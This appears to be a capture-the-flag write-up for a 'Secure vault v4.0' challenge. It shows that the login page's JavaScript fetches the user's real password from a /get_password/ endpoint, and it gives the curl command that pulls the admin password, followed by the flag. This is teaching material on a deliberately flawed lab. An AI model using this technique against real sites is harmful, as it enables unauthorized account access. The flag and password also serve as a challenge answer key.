# Secure vault v4.0 writeup
There is a login form in the given website. SQL-injections don't seem to work, so let's analyse website.

There are no cookies, no html secrets. The only thing to look at is a login form. Here is html code of it:

```html
<form action="" method="post" class="justify-content-center" id="login-form" onsubmit="return validateForm();">
	<p>
	 	<label class="form-check-label" for="username" style="align:center">Username</label>
		<br>
		<input id="form-username" name="username" required type="text" value=""> </p>
	<p>
		<label class="form-check-label" for="password" style="align:center">Password</label>
		<br>
		<input id="form-password" name="password" required type="password" value="">
	</p>
	<p>
		<input class="btn btn-danger" id="form-button" name="submit" type="submit" value="Login">
	</p>
</form>
```

According to the `<form>`, `validateForm()` is a handler for this form. Here is it:

```js
var isCorrect = false;

function checkPassword() {
    let url = "/get_password/";
    let xhr = new XMLHttpRequest();

    xhr.open("GET", url + $("#form-username")[0].value + "/", false);
    xhr.onloadend = function () {
        let response = xhr.responseText;
        if (response == "INCORRECT_USERNAME") {
            $("#error-msg")[0].innerHTML = "Incorrect username."
        }
        else {
            let currPassword = $("#form-password")[0].value;
            if (currPassword == response) {
                isCorrect = true;
            }
            else {
                $("#error-msg")[0].innerHTML = "Incorrect password.";
            }
        }

    };

    xhr.setRequestHeader("Content-Type", "text/plain");
    xhr.send();
    return true;
}

function validateForm() {
    Promise.all(checkPassword())
    if (isCorrect) {
        isCorrect = false;
        return true;
    }
    return false;  
}
```

Function gets the password of the given user via GET-query to the `/get_password/` endpoint. After that, the original password is compared to the one user entered. So, we may try to get the admin password:

```bash
$ curl http://ctf.li2sites.ru:21011/get_password/admin/
c&azl+1xYqmNtxA#a?q
```

Having logged in as `admin`, we get:

```html
<div class="p-3 mb-2 bg-secondary text-white row justify-content-center">
	li2CTF{H000000W????_M4n_1'll_b3_b4ck_1n_4_y34r_w17h_MUCH_b3773r__s3cUr1ty!}
</div>
```

Flag: `li2CTF{H000000W????_M4n_1'll_b3_b4ck_1n_4_y34r_w17h_MUCH_b3773r__s3cUr1ty!}`
